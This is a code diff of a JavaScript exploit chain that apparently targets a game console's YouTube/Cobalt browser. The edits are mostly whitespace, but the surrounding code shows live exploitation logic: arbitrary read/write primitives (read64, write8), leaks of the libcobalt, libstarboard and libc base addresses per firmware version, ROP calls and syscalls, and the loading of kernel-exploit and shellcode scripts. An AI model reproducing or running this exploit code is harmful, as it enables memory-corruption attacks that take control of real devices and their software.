@@ -155,7 +155,7 @@ const topPadding = Math.floor(window.innerHeight * 0.005);
 
 async function log(msg) {
     let message = String(msg);
-    if (message !== version_string && (log_phase === 'startup' || log_phase === 'quiet')) return;
+    //if (message !== version_string && (log_phase === 'startup' || log_phase === 'quiet')) return;
     if (!outputElement) {
         outputElement = document.getElementById('output');
         if (!outputElement) {
@@ -721,8 +721,6 @@ function trigger() {
             return backing_store;
         }
         
-        
-        
         // https://github.com/google/google-ctf/tree/main/2023/quals/sandbox-v8box/solution
         // We don't have pointer compression
         
@@ -785,7 +783,7 @@ function trigger() {
             libstarboard_base = read64(libcobalt_base + Y2_OFFSET.LIBSTARBOARD_LEAK1) - Y2_OFFSET.LIBSTARBOARD_LEAK2;
             
             libc_base = read64(libstarboard_base + Y2_OFFSET.LIBC_LEAK1) - Y2_OFFSET.LIBC_LEAK2;
-            
+       
         } else if (cbn === "05730512") {
             Y2_VERSION = "01.009.202 (min fw 13.20)";
             Y2_OFFSET = Y2_OFFSET_1320;
@@ -795,8 +793,8 @@ function trigger() {
             
             libstarboard_base = read64(libcobalt_base + Y2_OFFSET.LIBSTARBOARD_LEAK1) - Y2_OFFSET.LIBSTARBOARD_LEAK2;
             
-            libc_base = read64(libstarboard_base + Y2_OFFSET.LIBC_LEAK1) - Y2_OFFSET.LIBC_LEAK2;
-            
+            libc_base = read64(libstarboard_base + Y2_OFFSET.LIBC_LEAK1) - Y2_OFFSET.LIBC_LEAK2;  
+        
         } else if (cbn === "06170617") {
             Y2_VERSION = "01.009.253 (min fw 13.40)";
             Y2_OFFSET = Y2_OFFSET_1340;
@@ -887,7 +885,6 @@ function trigger() {
             
             return return_value_buf[0];
         }
-        
         
         rop_test = call(ROP.mov_rax_0x200000000);
         
@@ -1003,9 +1000,7 @@ function trigger() {
             //await log("is_running_addr: " + toHex(is_running_addr));
             
             // Set is_running to 1 (true)
-            write8(is_running_addr, 0x1n);
-            
-            
+            write8(is_running_addr, 0x1n);  
         } else {
             
             // This is voodoo hack
@@ -1020,16 +1015,12 @@ function trigger() {
             while (call(sceMsgDialogTerminate) !== 0n) {
                 call(sceErrorDialogTerminate);
                 syscall(SYSCALL.nanosleep, timespec);
-            }
-            
+            }     
         }
-        
         
         FW_VERSION = get_fwversion();
         TITLE_ID = get_title_id();
         
-        
-
         await load_localscript('kernel.js');
         await load_localscript('aioshellcode.js');
         await load_localscript('kexp.js');
@@ -1048,9 +1039,6 @@ function trigger() {
             if (autoload_sent) kill_youtube();
         } else {
             log_phase = 'quiet';
-        }
-
-        
-    } catch (e) { }
-    
+        }   
+    } catch (e) { }  
 })();
